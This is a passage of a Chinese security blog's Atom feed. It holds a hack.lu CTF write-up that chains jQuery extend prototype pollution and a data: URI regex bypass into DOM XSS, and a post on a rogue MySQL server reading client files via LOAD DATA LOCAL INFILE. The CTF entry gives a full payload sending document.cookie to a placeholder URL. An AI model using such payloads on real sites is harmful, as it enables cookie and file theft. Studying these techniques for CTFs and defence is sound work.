;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#52;&amp;amp;#51;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#55;&amp;amp;#52;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#54;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://lcark.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>hack.lu ctf-Car Repair Shop(xss, prototype pollution, bypass) </title>
    <link href="https://lcark.github.io/2019/10/26/hack-lu-ctf-Car-Repair-Shop/"/>
    <id>https://lcark.github.io/2019/10/26/hack-lu-ctf-Car-Repair-Shop/</id>
    <published>2019-10-26T15:57:00.000Z</published>
    <updated>2019-10-27T09:57:18.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>“Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.” <a href="https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/" target="_blank" rel="noopener">传送门</a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>点开题目，右下角有个明显的链接<code>get your cookie</code>, 是一个提交链接的界面</p><p><img src="/images/pasted-0.png" alt="upload successful"></p><p>显然是dom-based xss<br><br>以下是关键代码<br><br>car.class.js</p><a id="more"></a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"> ……</span><br><span class="line">    repair() &#123;</span><br><span class="line">        <span class="keyword">if</span>(urlParams.has(<span class="string">'repair'</span>)) &#123;</span><br><span class="line">            $.extend(<span class="literal">true</span>, <span class="keyword">this</span>, <span class="built_in">JSON</span>.parse(urlParams.get(<span class="string">'repair'</span>)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ignition() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.key == <span class="string">""</span>) &#123;</span><br><span class="line">            infobox(<span class="string">`Looks like the key got lost. No wonder the car is not starting ...`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.key == <span class="string">"🔑"</span>) &#123;</span><br><span class="line">            infobox(<span class="string">`The car started!`</span>)</span><br><span class="line">            <span class="keyword">this</span>.start()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>util.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cars = [bugatti, porsche]</span><br><span class="line">porsche.repair = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!bugatti.isStarted())&#123;</span><br><span class="line">        infobox(<span class="string">`Not so fast. Repair the other car first!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($.md5(porsche) == <span class="string">'9cdfb439c7876e703e307864c9167a15'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(urlParams.has(<span class="string">'help'</span>)) &#123;</span><br><span class="line">            repairWithHelper(urlParams.get(<span class="string">'help'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        infobox(<span class="string">`Repairing this is not that easy.`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> autoStart = <span class="function">(<span class="params">car</span>) =&gt;</span> &#123;</span><br><span class="line">    car.repair()</span><br><span class="line">    car.ignition()</span><br><span class="line">    car.powerOn()</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">'Bugatti'</span>))</span><br><span class="line">        autoStart(bugatti)</span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">'Porsche'</span>))</span><br><span class="line">        autoStart(porsche)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> repairWithHelper = <span class="function">(<span class="params">src</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">/* who needs csp anyways !? */</span></span><br><span class="line">    urlRegx = <span class="regexp">/^\w&#123;4,5&#125;:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/</span>;</span><br><span class="line">    <span class="keyword">if</span> (urlRegx.test(src)) &#123;</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>)</span><br><span class="line">        s.src = src</span><br><span class="line">        $(<span class="string">'head'</span>).append(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要通过<code>autoStart</code>修复<code>bugatti</code>和<code>porsche</code>这两辆车来执行<br><code>repairWithHelper</code>函数以此来触发xss，我们需要解决以下问题</p><ol><li>绕过 key == “🔑”来启动 <code>bugatti</code></li><li>绕过 $.md5(porsche) == ‘9cdfb439c7876e703e307864c9167a15’来执行<code>repairWithHelper</code>函数</li><li>绕过<code>repairWithHelper</code>函数中的正则表达式来执行js<br></li></ol><p>要解决第一个问题，我们发现了如下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">repair() &#123;</span><br><span class="line">    <span class="keyword">if</span>(urlParams.has(<span class="string">'repair'</span>)) &#123;</span><br><span class="line">        $.extend(<span class="literal">true</span>, <span class="keyword">this</span>, <span class="built_in">JSON</span>.parse(urlParams.get(<span class="string">'repair'</span>)))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是<code>jQuery</code>官方对<code>extend</code>函数的定义：<br><img src="/images/pasted-1.png" alt="upload successful"><br>这样我们就可以在<code>url</code>中添加<code>repair</code>参数来解决第一个问题:<br><code>https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair={&quot;key&quot;:&quot;🔑&quot;,&quot;}#BugattiPorsche</code></p><p>第二个问题似乎就没有这么简单，我们要使<code>porsch</code>的md5为<code>9cdfb439c7876e703e307864c9167a15</code>,实际上就是<code>lol</code>的md5值，我们不妨直接计算<code>porsche</code>的md5</p><p><img src="/images/pasted-2.png" alt="upload successful"><br>发现其md5为<code>[object Object]</code>的md5，这是为什么呢？<br>实际上调用md5函数之前会调用<code>toString</code>方法，而<code>porsche</code>又继承于<code>Object</code>类，我们不妨改写此方法<br><img src="/images/pasted-3.png" alt="upload successful"><br>和我们料想的一模一样，因此可以改写<code>porsche</code>的<code>toString</code>方法来绕过，然而<code>JSON.parse</code>并不支持方法的解析，那怎么办呢？<br>我们就不得不了解一下js中的<code>prototype</code>，什么是原型呢？<br>引用《JavaScript权威指南》的一段描述：</p><blockquote><p>Every JavaScript object has a second JavaScript object (or null ,but this is rare) associated with it. This second object is known as a prototype, and the first object inherits properties from the prototype.</p></blockquote><p>意思就是基本上每个js对象都有一个第二对象，这个对象就是原型，第一对象的所有属性都继承于原型。</p><p><img src="/images/pasted-4.png" alt="upload successful"></p><p>当调用一个对象的属性或方法时，它首先会从当前对象所定义的属性和对象寻找，若是没有，则从所继承的对象寻找即从<code>__proto__</code>寻找，若还是没有，则继续从<code>__proto__.proto__</code>寻找，直至最后。简而言之，<code>__proto__</code>所代表的就是所继承对象的原型，我们可以通过修改这个<code>__proto__</code>来达到修改父类属性或方法的目的，甚至直接修改它的父类。</p><p><img src="/images/pasted-5.png" alt="upload successful"></p><p>那么第二个问题就迎刃而解，我们将<code>porsche</code>的父类的父类改为<code>[&#39;lol&#39;]</code>，这样就会调用<code>toString</code>返回<code>lol</code>来绕过<code>md5</code>检测。</p><p><img src="/images/pasted-6.png" alt="upload successful"></p><p><code>payload: repair={&quot;key&quot;:&quot;🔑&quot;,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}</code></p><p>第三个问题我们需要绕过<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^\w&#123;4,5&#125;:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;</span><br></pre></td></tr></table></figure><p>这个正则表达式，这个我们用<code>data</code>协议绕过即可：<br><br><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</code></p><p><img src="/images/pasted-7.png" alt="upload successful"></p><p>OK！以下是完整payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair=&#123;&quot;key&quot;:&quot;🔑&quot;,&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:[&quot;lol&quot;]&#125;&#125;&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/a/,$.get(&apos;[your-url]&apos;+document.cookie)//.js#Bugatti%20Porsche</span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol><li>使用extend绕过key的检测</li><li>替换<code>porsche</code>的父类来绕过md5</li><li>使用data协议绕过src的正则表达式</li></ol><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><ol><li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></li><li><a href="https://github.com/creeperyang/blog/issues/9" target="_blank" rel="noopener">https://github.com/creeperyang/blog/issues/9</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;“Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.” &lt;a href=&quot;https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;传送门&lt;/a&gt;&lt;/p&gt;&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;点开题目，右下角有个明显的链接&lt;code&gt;get your cookie&lt;/code&gt;, 是一个提交链接的界面&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-0.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;&lt;p&gt;显然是dom-based xss&lt;br&gt;&lt;br&gt;以下是关键代码&lt;br&gt;&lt;br&gt;car.class.js&lt;/p&gt;
    
    </summary>
    
    
      <category term="web security" scheme="https://lcark.github.io/categories/web-security/"/>
    
    
      <category term="ctf" scheme="https://lcark.github.io/tags/ctf/"/>
    
      <category term="xss" scheme="https://lcark.github.io/tags/xss/"/>
    
      <category term="prototype pollution" scheme="https://lcark.github.io/tags/prototype-pollution/"/>
    
  </entry>
  
  <entry>
    <title>MysqlClientAttack</title>
    <link href="https://lcark.github.io/2019/09/24/tags/"/>
    <id>https://lcark.github.io/2019/09/24/tags/</id>
    <published>2019-09-24T13:06:00.000Z</published>
    <updated>2019-10-12T09:02:46.790Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="#漏洞分析"></a>#漏洞分析</h2><p>在mysql中可以通过<code>load data local infile &quot;/var/lib/mysql-files/test.txt&quot; into table test</code>命令，将本地文件上传至MySQL服务器，实际上，服务器可以直接发出请求来读取客户端文件，而不需要经过用户同意。</p><a id="more"></a><h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>客户端发出命令请求<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925223700-eef63dc0-dfa1-1.png" alt="image.png"><br>服务端发出读取文件请求<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925223739-064eca3c-dfa2-1.png" alt="image.png"><br>客户端发送文件<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925223903-381ed7fa-dfa2-1.png" alt="image.png"><br>若是服务端直接发出读取文件请求，客户端便会直接发送本地文件。</p><h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><hr><p>客户端连接服务器<br>服务器发送Greeting包，要求客户端提供密码<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224231-b40f5178-dfa2-1.png" alt="image.png"><br>客户端发送登陆请求<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224419-f4effe22-dfa2-1.png" alt="image.png"><br>服务端直接发出ok，然后服务端直接发出读取文件请求<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224712-5ba065da-dfa3-1.png" alt="image.png"><br>客户端便会直接发送本地文件。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224744-6ee9ec1a-dfa3-1.png" alt="image.png"></p><h1 id="攻击总览"><a href="#攻击总览" class="headerlink" title="攻击总览"></a>攻击总览</h1><hr><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925225550-908cd930-dfa4-1.png" alt="image.png"><br>注意中间的query request是每次登陆成功的版本号查询，我们并未响应<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925225737-d06485e4-dfa4-1.png" alt="image.png"></p><h1 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h1><hr><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925225915-0aaf8730-dfa5-1.png" alt="image.png"><br>详见 <a href="https://github.com/lcark/MysqlClientAttack/" target="_blank" rel="noopener">https://github.com/lcark/MysqlClientAttack/</a></p><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><hr><p>运行脚本，监听本地端口<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190930162007-1ca83a22-e35b-1.png" alt="image.png"><br>客户端连接<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190930162037-2eb0676c-e35b-1.png" alt="image.png"><br>一有连接，即可读取到客户端文件</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190930162117-463b20de-e35b-1.png" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;#漏洞分析&quot;&gt;&lt;/a&gt;#漏洞分析&lt;/h2&gt;&lt;p&gt;在mysql中可以通过&lt;code&gt;load data local infile &amp;quot;/var/lib/mysql-files/test.txt&amp;quot; into table test&lt;/code&gt;命令，将本地文件上传至MySQL服务器，实际上，服务器可以直接发出请求来读取客户端文件，而不需要经过用户同意。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web security" scheme="https://lcark.github.io/categories/web-security/"/>
    
    
      <category term="mysql" scheme="https://lcark.github.io/tags/mysql/"/>
    
      <category term="web" scheme="https://lcark.github.io/tags/web/"/>
    
      <category term="client" scheme="https://lcark.github.io/tags/client/"/>
    
  </entry>
  
</feed>
